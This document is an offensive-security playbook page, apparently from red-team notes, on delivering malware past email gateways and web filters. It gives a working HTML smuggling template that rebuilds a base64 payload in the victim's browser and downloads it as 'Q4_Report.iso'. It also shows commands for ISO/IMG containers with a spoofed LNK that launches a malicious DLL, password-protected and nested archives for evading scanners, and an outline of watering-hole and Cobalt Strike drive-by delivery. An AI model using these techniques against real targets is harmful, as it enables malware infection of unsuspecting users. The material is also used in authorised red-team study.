## HTML Smuggling & Payload Delivery

Techniques for delivering payloads through web browsers and email, bypassing email gateways and web filters.

---

### HTML Smuggling

JavaScript assembles a malicious file entirely client-side in the victim's browser. The payload is base64-encoded in the HTML — no malicious file crosses the network, bypassing email gateway and proxy scanning.

#### Basic HTML Smuggling Template

```html
<html>
<body>
<p>Your document is downloading...</p>
<script>
    // Base64-encoded payload (e.g., an EXE, ISO, or HTA file)
    var base64 = "TVqQAAMAAAAEAAAA//8AALgAAAA..."; // truncated

    // Decode base64 to binary
    var binary = atob(base64);
    var bytes = new Uint8Array(binary.length);
    for (var i = 0; i < binary.length; i++) {
        bytes[i] = binary.charCodeAt(i);
    }

    // Create blob and trigger download
    var blob = new Blob([bytes], {type: 'application/octet-stream'});
    var url = URL.createObjectURL(blob);

    var a = document.createElement('a');
    a.href = url;
    a.download = 'Q4_Report.iso'; // Filename the victim sees
    document.body.appendChild(a);
    a.click();

    // Cleanup
    URL.revokeObjectURL(url);
</script>
</body>
</html>
```

#### Why It Works

- Email gateways scan attachments — but the HTML file itself is benign (just JavaScript)
- The malicious payload only exists after JavaScript execution in the browser
- Web proxies see an HTML page download, not a malicious binary
- Bypasses sandboxing that detonates email attachments

#### Delivery Methods

- Email attachment (`.html` file)
- Link to hosted HTML page
- Embedded in phishing email body (inline HTML with JavaScript)

> [!info]
> Pair HTML smuggling with an ISO/IMG container to bypass Mark-of-the-Web. The smuggled file is an ISO containing LNK + payload.

---

### ISO / IMG Containers

Disk image files that mount as virtual drives. Files inside **do not inherit Mark-of-the-Web (MOTW)**, bypassing SmartScreen and Protected View.

> [!warning]
> Microsoft patched MOTW bypass for ISO files in **November 2022** (KB5019980). Files inside ISOs now inherit MOTW on patched systems. Still effective against unpatched targets.

#### Creating an ISO

```sh
# Linux — mkisofs/genisoimage
mkisofs -o payload.iso -J -r payload_folder/

# Or use PackMyPayload
python3 PackMyPayload.py payload_folder/ payload.iso --iso
```

#### Common ISO Contents

```
payload.iso
├── Report.lnk          # Shortcut that runs the DLL
└── payload.dll          # Malicious DLL
```

The LNK file:
```
Target: C:\Windows\System32\rundll32.exe payload.dll,EntryPoint
Icon: Word document icon (spoofed)
```

#### IMG Files

Same concept as ISO — virtual disk image. Some email gateways block `.iso` but allow `.img`.

```sh
# Create IMG on Linux
dd if=/dev/zero of=payload.img bs=1M count=10
mkfs.fat payload.img
sudo mount payload.img /mnt
# Copy payload files to /mnt
sudo umount /mnt
```

---

### ZIP / Archive Delivery

#### Password-Protected ZIP

Password-protected archives bypass email gateway scanning — the gateway can't inspect the contents.

```sh
# Create password-protected ZIP
zip -e -P "Quarterly2025" payload.zip malicious.exe

# 7-Zip
7z a -p"Quarterly2025" payload.7z malicious.exe
```

Include the password in the email body: *"Password: Quarterly2025"*

> [!info]
> The password must be communicated out-of-band (in the email body, a separate message, etc). Email gateways can't decrypt the ZIP without it.

#### Self-Extracting Archives (SFX)

```sh
# Create SFX with 7-Zip (Windows)
# 7-Zip → Add to Archive → Create SFX archive
# Set "Run after extraction" to the payload filename
```

#### Nested Archives

Multiple layers of archiving to bypass scanning:

```sh
# Layer 1: payload in ZIP
zip inner.zip payload.exe
# Layer 2: ZIP in ZIP
zip outer.zip inner.zip
```

---

### Drive-By Download

Compromising targets via weaponised websites they visit.

#### Watering Hole Attack

1. Identify websites frequently visited by the target group (recon phase)
2. Compromise the website (exploit CMS vulnerability, inject JavaScript)
3. Inject payload delivery code (redirect to exploit kit, HTML smuggling, or direct download)

#### Cobalt Strike Web Drive-By

```
# Cobalt Strike — host scripted web delivery
Attacks → Web Drive-by → Scripted Web Delivery

# Generates a one-liner that the victim's browser executes
# Options: PowerShell, Python, regsvr32, bitsadmin
```

---

> See also: [[2. Weaponisation & Delivery/Malicious Documents]], [[2. Weaponisation & Delivery/DLL Sideloading]], [[3. Initial Compromise/b. Phishing Infrastructure]]
